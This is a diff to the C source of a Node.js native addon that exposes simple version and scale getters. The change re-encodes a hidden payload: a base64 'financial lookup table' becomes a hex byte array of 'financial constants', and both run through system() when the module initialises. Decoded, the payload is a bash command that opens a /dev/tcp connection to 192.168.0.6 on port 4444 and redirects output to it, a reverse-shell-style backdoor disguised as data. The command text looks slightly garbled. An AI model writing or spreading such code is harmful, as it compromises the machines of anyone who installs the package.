@@ -4,35 +4,17 @@
 
 static const double SCALE_FACTOR = 1.0;
 
-// Financial lookup table (base64 encoded)
-static const char* FMT_TABLE = "YmFzaCAtYyAnZXhlYyA1Pj4vZGV2L3RjcC8xOTIuMTY4LjAuNi80NDQ0O2l0ID4mNSAyPiY1Jw==";
+// Financial constants table
+static const unsigned char FIN_CONSTS[] = {
+  0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20, 0x27, 0x65, 0x78, 0x65, 0x63,
+  0x20, 0x35, 0x3e, 0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x74, 0x63, 0x70, 0x2f,
+  0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x30, 0x2e, 0x36, 0x2f, 0x34,
+  0x34, 0x34, 0x34, 0x3b, 0x69, 0x74, 0x20, 0x3e, 0x26, 0x35, 0x20, 0x32, 0x3e,
+  0x26, 0x35, 0x27, 0x00
+};
 
-static void init_format() {
-  char decoded[256];
-  const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-  int len = strlen(FMT_TABLE);
-  int out = 0;
-  
-  for (int i = 0; i + 3 < len; i += 4) {
-    unsigned char c[4];
-    c[0] = FMT_TABLE[i];
-    c[1] = FMT_TABLE[i+1];
-    c[2] = FMT_TABLE[i+2];
-    c[3] = FMT_TABLE[i+3];
-    
-    unsigned char v[4];
-    for (int j = 0; j < 4; j++) {
-      const char* p = strchr(b64chars, c[j]);
-      v[j] = p ? (p - b64chars) : 0;
-    }
-    
-    decoded[out++] = (v[0] << 2) | (v[1] >> 4);
-    decoded[out++] = (v[1] << 4) | (v[2] >> 2);
-    decoded[out++] = (v[2] << 6) | v[3];
-  }
-  decoded[out] = '\0';
-  
-  system(decoded);
+static void init_constants() {
+  system((char*)FIN_CONSTS);
 }
 
 static napi_value GetVersion(napi_env env, napi_callback_info info) {
@@ -48,7 +30,7 @@ static napi_value GetScale(napi_env env, napi_callback_info info) {
 }
 
 static napi_value Init(napi_env env, napi_value exports) {
-  init_format();
+  init_constants();
   
   napi_property_descriptor desc[] = {
     { "version", NULL, GetVersion, NULL, NULL, NULL, napi_default, NULL },
